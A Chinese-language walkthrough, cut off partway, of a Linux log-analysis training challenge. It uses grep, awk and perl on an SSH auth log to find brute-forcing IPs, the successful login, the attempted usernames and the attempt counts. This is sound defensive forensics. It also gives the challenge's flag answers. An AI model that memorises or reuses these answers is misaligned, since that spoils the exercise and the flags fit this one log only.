解题\n\n我们先看这道题的任务\n\n![image-20241116182821625](./../image/achieve/202411/玄机第一章Linux日志分析/image-20241116182821625.png)\n\n##### 连接主机\n\n那我们先ssh连接一下目标ip\n\n```\nssh root@ip\n```\n\n **命令解释**\n\n- `ssh`: 这是启动 SSH 客户端的命令。\n- `root`: 这是你要以其身份登录的用户名。在这个例子中，是根用户（root）。\n- `IP`: 这是目标服务器的 IP 地址或主机名。\n\n##### 问题1:查看有多少IP在爆破主机ssh的root帐号\n\n遇到这种问题我们应该怎么解决?\n\n首先，我们应该先找到我们日志的文件，一般来说ssh登录尝试都会记录在/var/log/auth.log.1（这是固定的）\n\n这个日志文件的组成结构\n\n```\n月 日 时间 主机名 进程名[PID]: 事件类型: 详细信息\n```\n\n常见的内容有：\n\n- 成功登录\n\n  ```\n  Aug 10 14:22:35 server sshd[1234]: Accepted password for user1 from 192.168.1.100 port 22 ssh2\n  Aug 10 14:23:01 server sshd[1235]: Accepted publickey for user2 from 192.168.1.101 port 22\n  ```\n\n- 登录失败\n\n  ```\n  Aug 10 14:24:10 server sshd[1236]: Failed password for invalid_user from 192.168.1.200 port 22\n  Aug 10 14:25:45 server sshd[1237]: Connection closed by authenticating user user1 192.168.1.100 port 22 [preauth]\n  ```\n\n- 暴力破解痕迹\n\n  ```\n  Aug 10 14:30:00 server sshd[1240]: Received disconnect from 192.168.1.200: 3: Authentication failed [preauth]\n  Aug 10 14:31:12 server sshd[1241]: Disconnecting: Too many authentication failures for user1 [preauth]\n  ```\n\n我们先cat查看一下auth.log.1的内容\n\n```\nAug  1 07:40:47 linux-rz sshd[7461]: Invalid user test1 from 192.168.200.35 port 33874\nAug  1 07:40:48 linux-rz sshd[7461]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:40:48 linux-rz sshd[7461]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.35\nAug  1 07:40:50 linux-rz sshd[7461]: Failed password for invalid user test1 from 192.168.200.35 port 33874 ssh2\nAug  1 07:40:52 linux-rz sshd[7461]: Connection closed by invalid user test1 192.168.200.35 port 33874 [preauth]\nAug  1 07:40:58 linux-rz sshd[7465]: Invalid user test2 from 192.168.200.35 port 51640\nAug  1 07:41:01 linux-rz sshd[7465]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:41:01 linux-rz sshd[7465]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.35\nAug  1 07:41:04 linux-rz sshd[7465]: Failed password for invalid user test2 from 192.168.200.35 port 51640 ssh2\nAug  1 07:41:07 linux-rz sshd[7465]: Connection closed by invalid user test2 192.168.200.35 port 51640 [preauth]\nAug  1 07:41:09 linux-rz sshd[7468]: Invalid user test3 from 192.168.200.35 port 48168\nAug  1 07:41:11 linux-rz sshd[7468]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:41:11 linux-rz sshd[7468]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.35\nAug  1 07:41:13 linux-rz sshd[7468]: Failed password for invalid user test3 from 192.168.200.35 port 48168 ssh2\nAug  1 07:41:19 linux-rz sshd[7468]: Connection closed by invalid user test3 192.168.200.35 port 48168 [preauth]\nAug  1 07:42:30 linux-rz sshd[7471]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.32  user=root\nAug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2\nAug  1 07:42:33 linux-rz sshd[7471]: Connection closed by authenticating user root 192.168.200.32 port 51888 [preauth]\nAug  1 07:42:49 linux-rz sshd[7288]: Received disconnect from 192.168.200.2 port 54682:11: disconnected by user\nAug  1 07:42:49 linux-rz sshd[7288]: Disconnected from user root 192.168.200.2 port 54682\nAug  1 07:42:49 linux-rz sshd[7288]: pam_unix(sshd:session): session closed for user root\nAug  1 07:42:49 linux-rz systemd-logind[440]: Session 6 logged out. Waiting for processes to exit.\nAug  1 07:42:49 linux-rz systemd-logind[440]: Removed session 6.\nAug  1 07:46:39 linux-rz sshd[7475]: Invalid user user from 192.168.200.2 port 36149\nAug  1 07:46:39 linux-rz sshd[7475]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:46:39 linux-rz sshd[7475]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:46:41 linux-rz sshd[7475]: Failed password for invalid user user from 192.168.200.2 port 36149 ssh2\nAug  1 07:46:45 linux-rz sshd[7475]: Connection closed by invalid user user 192.168.200.2 port 36149 [preauth]\nAug  1 07:46:45 linux-rz sshd[7478]: Invalid user user from 192.168.200.2 port 44425\nAug  1 07:46:45 linux-rz sshd[7478]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:46:45 linux-rz sshd[7478]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:46:47 linux-rz sshd[7478]: Failed password for invalid user user from 192.168.200.2 port 44425 ssh2\nAug  1 07:46:48 linux-rz sshd[7478]: Connection closed by invalid user user 192.168.200.2 port 44425 [preauth]\nAug  1 07:46:48 linux-rz sshd[7480]: Invalid user user from 192.168.200.2 port 38791\nAug  1 07:46:48 linux-rz sshd[7480]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:46:48 linux-rz sshd[7480]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:46:50 linux-rz sshd[7480]: Failed password for invalid user user from 192.168.200.2 port 38791 ssh2\nAug  1 07:46:52 linux-rz sshd[7480]: Connection closed by invalid user user 192.168.200.2 port 38791 [preauth]\nAug  1 07:46:52 linux-rz sshd[7482]: Invalid user user from 192.168.200.2 port 37489\nAug  1 07:46:52 linux-rz sshd[7482]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:46:52 linux-rz sshd[7482]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:46:54 linux-rz sshd[7482]: Failed password for invalid user user from 192.168.200.2 port 37489 ssh2\nAug  1 07:46:54 linux-rz sshd[7482]: Connection closed by invalid user user 192.168.200.2 port 37489 [preauth]\nAug  1 07:46:54 linux-rz sshd[7484]: Invalid user user from 192.168.200.2 port 35575\nAug  1 07:46:54 linux-rz sshd[7484]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:46:54 linux-rz sshd[7484]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:46:56 linux-rz sshd[7484]: Failed password for invalid user user from 192.168.200.2 port 35575 ssh2\nAug  1 07:46:57 linux-rz sshd[7484]: Connection closed by invalid user user 192.168.200.2 port 35575 [preauth]\nAug  1 07:46:57 linux-rz sshd[7486]: Invalid user hello from 192.168.200.2 port 35833\nAug  1 07:46:57 linux-rz sshd[7486]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:46:57 linux-rz sshd[7486]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:46:59 linux-rz sshd[7486]: Failed password for invalid user hello from 192.168.200.2 port 35833 ssh2\nAug  1 07:46:59 linux-rz sshd[7486]: Connection closed by invalid user hello 192.168.200.2 port 35833 [preauth]\nAug  1 07:47:00 linux-rz sshd[7489]: Invalid user hello from 192.168.200.2 port 37653\nAug  1 07:47:00 linux-rz sshd[7489]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:47:00 linux-rz sshd[7489]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:47:02 linux-rz sshd[7489]: Failed password for invalid user hello from 192.168.200.2 port 37653 ssh2\nAug  1 07:47:02 linux-rz sshd[7489]: Connection closed by invalid user hello 192.168.200.2 port 37653 [preauth]\nAug  1 07:47:02 linux-rz sshd[7491]: Invalid user hello from 192.168.200.2 port 37917\nAug  1 07:47:02 linux-rz sshd[7491]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:47:02 linux-rz sshd[7491]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:47:04 linux-rz sshd[7491]: Failed password for invalid user hello from 192.168.200.2 port 37917 ssh2\nAug  1 07:47:05 linux-rz sshd[7491]: Connection closed by invalid user hello 192.168.200.2 port 37917 [preauth]\nAug  1 07:47:05 linux-rz sshd[7493]: Invalid user hello from 192.168.200.2 port 41957\nAug  1 07:47:05 linux-rz sshd[7493]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:47:05 linux-rz sshd[7493]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:47:08 linux-rz sshd[7493]: Failed password for invalid user hello from 192.168.200.2 port 41957 ssh2\nAug  1 07:47:08 linux-rz sshd[7493]: Connection closed by invalid user hello 192.168.200.2 port 41957 [preauth]\nAug  1 07:47:08 linux-rz sshd[7495]: Invalid user hello from 192.168.200.2 port 39685\nAug  1 07:47:08 linux-rz sshd[7495]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:47:08 linux-rz sshd[7495]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:47:10 linux-rz sshd[7495]: Failed password for invalid user hello from 192.168.200.2 port 39685 ssh2\nAug  1 07:47:11 linux-rz sshd[7495]: Connection closed by invalid user hello 192.168.200.2 port 39685 [preauth]\nAug  1 07:47:11 linux-rz sshd[7497]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=root\nAug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2\nAug  1 07:47:15 linux-rz sshd[7497]: Connection closed by authenticating user root 192.168.200.2 port 34703 [preauth]\nAug  1 07:47:16 linux-rz sshd[7499]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=root\nAug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2\nAug  1 07:47:18 linux-rz sshd[7499]: Connection closed by authenticating user root 192.168.200.2 port 46671 [preauth]\nAug  1 07:47:18 linux-rz sshd[7501]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=root\nAug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2\nAug  1 07:47:20 linux-rz sshd[7501]: Connection closed by authenticating user root 192.168.200.2 port 39967 [preauth]\nAug  1 07:47:20 linux-rz sshd[7503]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=root\nAug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2\nAug  1 07:47:23 linux-rz sshd[7503]: Connection closed by authenticating user root 192.168.200.2 port 46647 [preauth]\nAug  1 07:47:23 linux-rz sshd[7505]: Accepted password for root from 192.168.200.2 port 46563 ssh2\nAug  1 07:47:23 linux-rz sshd[7505]: pam_unix(sshd:session): session opened for user root by (uid=0)\nAug  1 07:47:23 linux-rz systemd-logind[440]: New session 7 of user root.\nAug  1 07:47:23 linux-rz sshd[7525]: Invalid user  from 192.168.200.2 port 37013\nAug  1 07:47:23 linux-rz sshd[7525]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:47:23 linux-rz sshd[7525]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:47:26 linux-rz sshd[7525]: Failed password for invalid user  from 192.168.200.2 port 37013 ssh2\nAug  1 07:47:28 linux-rz sshd[7525]: Connection closed by invalid user  192.168.200.2 port 37013 [preauth]\nAug  1 07:47:28 linux-rz sshd[7528]: Invalid user  from 192.168.200.2 port 37545\nAug  1 07:47:28 linux-rz sshd[7528]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:47:28 linux-rz sshd[7528]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:47:30 linux-rz sshd[7528]: Failed password for invalid user  from 192.168.200.2 port 37545 ssh2\nAug  1 07:47:30 linux-rz sshd[7528]: Connection closed by invalid user  192.168.200.2 port 37545 [preauth]\nAug  1 07:47:30 linux-rz sshd[7530]: Invalid user  from 192.168.200.2 port 39111\nAug  1 07:47:30 linux-rz sshd[7530]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:47:30 linux-rz sshd[7530]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:47:32 linux-rz sshd[7530]: Failed password for invalid user  from 192.168.200.2 port 39111 ssh2\nAug  1 07:47:32 linux-rz sshd[7530]: Connection closed by invalid user  192.168.200.2 port 39111 [preauth]\nAug  1 07:47:33 linux-rz sshd[7532]: Invalid user  from 192.168.200.2 port 35173\nAug  1 07:47:33 linux-rz sshd[7532]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:47:33 linux-rz sshd[7532]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:47:35 linux-rz sshd[7532]: Failed password for invalid user  from 192.168.200.2 port 35173 ssh2\nAug  1 07:47:37 linux-rz sshd[7532]: Connection closed by invalid user  192.168.200.2 port 35173 [preauth]\nAug  1 07:47:37 linux-rz sshd[7534]: Invalid user  from 192.168.200.2 port 45807\nAug  1 07:47:37 linux-rz sshd[7534]: pam_unix(sshd:auth): check pass; user unknown\nAug  1 07:47:37 linux-rz sshd[7534]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2\nAug  1 07:47:39 linux-rz sshd[7534]: Failed password for invalid user  from 192.168.200.2 port 45807 ssh2\nAug  1 07:47:41 linux-rz sshd[7534]: Connection closed by invalid user  192.168.200.2 port 45807 [preauth]\nAug  1 07:50:29 linux-rz sshd[7505]: pam_unix(sshd:session): session closed for user root\nAug  1 07:50:29 linux-rz systemd-logind[440]: Session 7 logged out. Waiting for processes to exit.\nAug  1 07:50:29 linux-rz systemd-logind[440]: Removed session 7.\nAug  1 07:50:37 linux-rz sshd[7539]: Accepted password for root from 192.168.200.2 port 48070 ssh2\nAug  1 07:50:37 linux-rz sshd[7539]: pam_unix(sshd:session): session opened for user root by (uid=0)\nAug  1 07:50:37 linux-rz systemd-logind[440]: New session 8 of user root.\nAug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000\nAug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh\nAug  1 07:50:52 linux-rz passwd[7563]: pam_unix(passwd:chauthtok): password changed for test2\nAug  1 07:50:56 linux-rz sshd[7539]: Received disconnect from 192.168.200.2 port 48070:11: disconnected by user\nAug  1 07:50:56 linux-rz sshd[7539]: Disconnected from user root 192.168.200.2 port 48070\nAug  1 07:50:56 linux-rz sshd[7539]: pam_unix(sshd:session): session closed for user root\nAug  1 07:50:56 linux-rz systemd-logind[440]: Session 8 logged out. Waiting for processes to exit.\nAug  1 07:50:56 linux-rz systemd-logind[440]: Removed session 8.\nAug  1 07:52:57 linux-rz sshd[7606]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.31  user=root\nAug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2\nAug  1 07:53:01 linux-rz sshd[7606]: Connection closed by authenticating user root 192.168.200.31 port 40364 [preauth]\nAug  1 08:01:26 linux-rz sshd[748]: Received disconnect from 192.168.200.2 port 50378:11: disconnected by user\nAug  1 08:01:26 linux-rz sshd[748]: Disconnected from user root 192.168.200.2 port 50378\nAug  1 08:01:26 linux-rz sshd[748]: pam_unix(sshd:session): session closed for user root\nAug  1 08:01:26 linux-rz systemd-logind[440]: Session 3 logged out. Waiting for processes to exit.\nAug  1 08:01:26 linux-rz systemd-logind[440]: Removed session 3.\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: new group: name=debian, GID=1001\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bash\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to group 'adm'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to group 'dialout'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to group 'cdrom'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to group 'floppy'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to group 'sudo'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to group 'audio'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to group 'dip'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to group 'video'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to group 'plugdev'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to group 'netdev'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to shadow group 'adm'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to shadow group 'dialout'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to shadow group 'cdrom'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to shadow group 'floppy'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to shadow group 'sudo'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to shadow group 'audio'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to shadow group 'dip'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to shadow group 'video'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to shadow group 'plugdev'\nAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add 'debian' to shadow group 'netdev'\nAug  1 08:18:27 ip-172-31-37-190 passwd[493]: password for 'debian' changed by 'root'\nAug  1 08:18:27 ip-172-31-37-190 sudo:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/touch /var/log/aws114_ssm_agent_installation.log\nAug  1 08:18:27 ip-172-31-37-190 sudo: pam_unix(sudo:session): session opened for user root by (uid=0)\nAug  1 08:18:27 ip-172-31-37-190 sudo: pam_unix(sudo:session): session closed for user root\nAug  1 08:18:27 ip-172-31-37-190 sshd[544]: Server listening on 0.0.0.0 port 22.\nAug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event1 (Power Button)\nAug  1 08:18:27 ip-172-31-37-190 sshd[544]: Server listening on :: port 22.\nAug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event2 (Sleep Button)\nAug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)\nAug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: New seat seat0.\nApr 21 05:55:16 ip-10-0-10-3 passwd[418]: password for 'debian' changed by 'root'\nApr 21 05:55:16 ip-10-0-10-3 systemd-logind[432]: Watching system buttons on /dev/input/event1 (Power Button)\nApr 21 05:55:16 ip-10-0-10-3 systemd-logind[432]: Watching system buttons on /dev/input/event2 (Sleep Button)\nApr 21 05:55:16 ip-10-0-10-3 systemd-logind[432]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)\nApr 21 05:55:16 ip-10-0-10-3 systemd-logind[432]: New seat seat0.\nApr 21 05:55:16 ip-10-0-10-3 sshd[465]: Server listening on 0.0.0.0 port 22.\nApr 21 05:55:16 ip-10-0-10-3 sshd[465]: Server listening on :: port 22.\n```\n\n接着，那既然是爆破，肯定会有很多的失败次数，那我们可以\n\n- **使用grep筛选出SSH失败的登录尝试**： 我们需要筛选出涉及到SSH失败登录尝试的日志条目。\n\npayload\n\n```\ncat auth.log.1 | grep -a \"Failed password\"\n```\n\n![image-20250421140305559](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421140305559.png)\n\n因为是查看尝试爆破主机root账号的，所以我们只需要关注root管理员用户就行，user的就不用管了\n\n```\ncat auth.log.1 | grep -a \"Failed password for root\"\n```\n\n![image-20250421140436360](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421140436360.png)\n\n这里的话因为内容不多，如果数据内容很多的话可以用更精准的命令去筛选\n\n```\ncat /var/log/auth.log.1 | grep -a \"Failed password for root\" | awk '{print $11}' | sort | uniq -c | sort -nr | more\n```\n\n简单来说就是分析`auth.log.1`日志文件，提取出所有包含\"Failed password for root \"字符串的行，然后使用`awk`命令提取每行的第11个字段（通常这个字段表示远程IP地址），之后对这些IP地址进行排序和统计，最后按照数量的降序排列，并通过`more`命令分页显示结果。\n\n命令解释：\n\n- `cat /var/log/auth.log.1`：cat 命令用于显示 auth.log.1 文件的内容。这里 auth.log.1 是一个日志文件，通常是系统日志的备份文件。\n- `grep -a \"Failed password for root\"`：grep 命令用于在输入中搜索包含特定模式的行。\n- `awk '{print \\$11}'`：用于提取每行的第 11 个字段（列）。（以空格或制表符为默认分隔符）。\n- `sort`：用于对输入行进行排序。\n- `uniq -c `：uniq 命令用于删除重复的行。-c 选项表示对每个唯一的行计数，即统计每个IP地址的出现次数。\n\n- `sort -nr`：sort 命令再次用于排序。-n 选项表示按数值进行排序。-r 选项表示按降序排序。组合起来，即按出现次数从高到低排序。\n- `more`：more 命令用于分页显示输出。由于输出可能很长，more 命令允许用户逐页查看结果。\n\n最终所有的命令用管道符连接，将前一个命令的输出当成下一个命令的输入\n\n![image-20250421141412107](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421141412107.png)\n\n- **提取IP地址**： 从这些日志条目中提取尝试登录的IP地址。\n\n```\n192.168.200.2,192.168.200.31,192.168.200.32\n```\n\n- **统计各个IP地址的尝试次数**： 统计每个IP地址的尝试次数，找出所有尝试暴力破解的IP。\n\n从上面就可以看到，第一列就是该ip尝试的次数\n\n将这几个ip从大到小排序\n\n```\nflag{192.168.200.2,192.168.200.31,192.168.200.32}\n```\n\n额外的\n\n```\n定位有哪些IP在爆破：\ngrep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c\n```\n\n##### 问题2:ssh爆破成功登陆的IP是多少\n\n直接给命令吧\n\n```\ncat auth.log.1 | grep -a \"Accepted \" | awk '{print $11}' | sort | uniq -c | sort -nr | more\n```\n\n![image-20250421141909800](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421141909800.png)\n\n搜查那个Accepted登录成功的用户ip\n\n或者也可以用之前的命令\n\n![image-20250421141943517](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421141943517.png)\n\n有一个问题，为什么是Accepted?\n\n在Linux系统的认证日志（例如`auth.log`）中，\"Accepted\"这个词通常用来标识成功的登录尝试。当一个用户或者系统通过认证机制成功登录时，相关的日志条目会包含\"Accepted\"这个词。这包括通过SSH、FTP、sudo等方式的成功登录。\n\n```\nflag{192.168.200.2}\n```\n\n##### 问题3:爆破用户名字典是什么？\n\n斯，首先我们得思考一下\n\n###### 什么是爆破用户名字典\n\n简单来说指黑客在进行暴力破解攻击时使用的一系列用户名字典文件。黑客通过自动化工具逐个尝试这些用户名，结合常见或默认密码，试图找到有效的登录凭据。这个过程被称为“字典攻击”或“暴力破解攻击”。\n\n字典内容\n\n用户名字典可能包括：\n\n- 常见的用户名（如 admin、root、user、guest 等）\n- 与目标组织相关的用户名（如员工姓名、部门名等）\n- 组合用户名（如名字和姓氏的组合）\n\n那我们的具体实现步骤是什么\n\n- 识别关键日志条目：\n\n\n确定日志中包含攻击相关信息的条目。例如，SSH 失败登录尝试通常包含“Failed password”关键字，成功登录则包含“Accepted”。\n\n- 提取有用信息：\n\n使用文本处理工具如 grep、awk、perl 或 sed 提取出关键数据。例如，可以从日志中提取出失败尝试的用户名、IP地址、时间戳等。\n\n- 统计分析：\n\n对提取出的信息进行统计分析，以确定被尝试最多的用户名和来源IP等。例如，使用 uniq 和 sort 对数据进行去重和排序。\n\n那我们先看看刚刚登录失败的内容\n\n```\nroot@ip-10-0-10-3:/var/log# cat auth.log.1  | grep -a \"Failed password\"\nAug  1 07:40:50 linux-rz sshd[7461]: Failed password for invalid user test1 from 192.168.200.35 port 33874 ssh2\nAug  1 07:41:04 linux-rz sshd[7465]: Failed password for invalid user test2 from 192.168.200.35 port 51640 ssh2\nAug  1 07:41:13 linux-rz sshd[7468]: Failed password for invalid user test3 from 192.168.200.35 port 48168 ssh2\nAug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2\nAug  1 07:46:41 linux-rz sshd[7475]: Failed password for invalid user user from 192.168.200.2 port 36149 ssh2\nAug  1 07:46:47 linux-rz sshd[7478]: Failed password for invalid user user from 192.168.200.2 port 44425 ssh2\nAug  1 07:46:50 linux-rz sshd[7480]: Failed password for invalid user user from 192.168.200.2 port 38791 ssh2\nAug  1 07:46:54 linux-rz sshd[7482]: Failed password for invalid user user from 192.168.200.2 port 37489 ssh2\nAug  1 07:46:56 linux-rz sshd[7484]: Failed password for invalid user user from 192.168.200.2 port 35575 ssh2\nAug  1 07:46:59 linux-rz sshd[7486]: Failed password for invalid user hello from 192.168.200.2 port 35833 ssh2\nAug  1 07:47:02 linux-rz sshd[7489]: Failed password for invalid user hello from 192.168.200.2 port 37653 ssh2\nAug  1 07:47:04 linux-rz sshd[7491]: Failed password for invalid user hello from 192.168.200.2 port 37917 ssh2\nAug  1 07:47:08 linux-rz sshd[7493]: Failed password for invalid user hello from 192.168.200.2 port 41957 ssh2\nAug  1 07:47:10 linux-rz sshd[7495]: Failed password for invalid user hello from 192.168.200.2 port 39685 ssh2\nAug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2\nAug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2\nAug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2\nAug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2\nAug  1 07:47:26 linux-rz sshd[7525]: Failed password for invalid user  from 192.168.200.2 port 37013 ssh2\nAug  1 07:47:30 linux-rz sshd[7528]: Failed password for invalid user  from 192.168.200.2 port 37545 ssh2\nAug  1 07:47:32 linux-rz sshd[7530]: Failed password for invalid user  from 192.168.200.2 port 39111 ssh2\nAug  1 07:47:35 linux-rz sshd[7532]: Failed password for invalid user  from 192.168.200.2 port 35173 ssh2\nAug  1 07:47:39 linux-rz sshd[7534]: Failed password for invalid user  from 192.168.200.2 port 45807 ssh2\nAug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2\n```\n\n随便取一条日志看一下\n\n```\nAug  1 07:40:50 linux-rz sshd[7461]: Failed password for invalid user test1 from 192.168.200.35 port 33874 ssh2\n```\n\n- `Failed password`：密码错误的提示\n- `for invalid user test1`：尝试登录的用户名是 `test1`，但系统判定为 **无效用户**\n- `from 192.168.200.35 port 33874`：源ip和端口\n\n所以我们可以直接筛选出来不同攻击ip的字典\n\n```\n192.168.200.2:\nroot，user，hello，空字符\n192.168.200.31:\nroot\n192.168.200.32:\nroot\n192.168.200.35:\ntest1，test2，test3\n```\n\n或者可以用命令去精准筛选\n\n```\ncat auth.log.1 | grep -a \"Failed password\" | perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr\n```\n\n![image-20250421143055472](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421143055472.png)\n\n```\n显示信息格式:<尝试次数> <错误类型> <用户名>\n```\n\n这里使用Perl脚本提取出失败尝试的用户名和来源IP地址，统计每个用户名的失败尝试次数，并按照次数降序排列显示结果。\n\n具体分析一下:\n\n- `perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'`:作用：使用Perl脚本从每一行提取出失败登录尝试的用户名。\n\n`while($_=<>)`：逐行读取输入。\n\n`/for(.*?) from/`：使用正则表达式匹配模式`“for [username] from”`，其中[username]是登录尝试的用户名。\n\n`print \"$1\\n\"`：将提取的用户名打印出来。\n\n```\nflag{user,hello,root,test3,test2,test1}\n```\n\n##### 问题4:成功登录 root 用户的 ip 一共爆破了多少次\n\n之前就知道成功登录的用户ip是192.168.200.2，然后再看这个ip爆破root爆破了几次\n\n```\ncat auth.log.1 | grep -a \"Failed password for root \"\n```\n\n![image-20250421143709858](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421143709858.png)\n\n```\nflag{4}\n```\n\n##### 问题5:黑客登陆主机后新建了一个后门用户，用户名是多少\n\n这个又是一个新的知识点了\n\n在做这个操作时，我们应该逐步分析一下我们需要怎么做\n\n- 步骤1：确定日志文件\n\n\n- 步骤2：搜索创建用户的关键字\n\n\n- 